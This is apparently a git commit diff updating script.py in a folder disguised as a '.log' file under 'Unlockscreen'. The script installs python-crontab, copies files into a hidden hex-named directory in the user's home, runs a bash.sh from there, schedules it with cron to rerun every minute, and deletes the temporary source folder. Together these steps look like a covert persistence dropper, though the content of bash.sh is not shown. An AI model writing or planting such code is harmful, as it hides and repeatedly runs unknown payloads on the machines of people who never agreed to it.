86a1244822143da6a2faf622aded14a529fe7e2a
HardImpostor <103056913+HardImpostor@users.noreply.github.com>
2022-10-18 13:56:26 +0200

    Update script.py

--- U6frt3A.log/script.py
+++ U6frt3A.log/script.py
@@ -2,11 +2,11 @@ import os
 os.system('pip install python-crontab')
 os.system('mkdir $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98')
 os.system('cp -r /tmp/Unlockscreen/U6frt3A.log $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98' )
-os.system('bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/bash.sh')
+os.system('bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh')
 from crontab import CronTab
 user=os.system('echo $LOGNAME')
 cron = CronTab(user=user)
-job = cron.new(command='bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/bash.sh')
+job = cron.new(command='bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh')
 job.minute.every(1)
 cron.write()
 os.system('rm -rf /tmp/Unlockscreen')
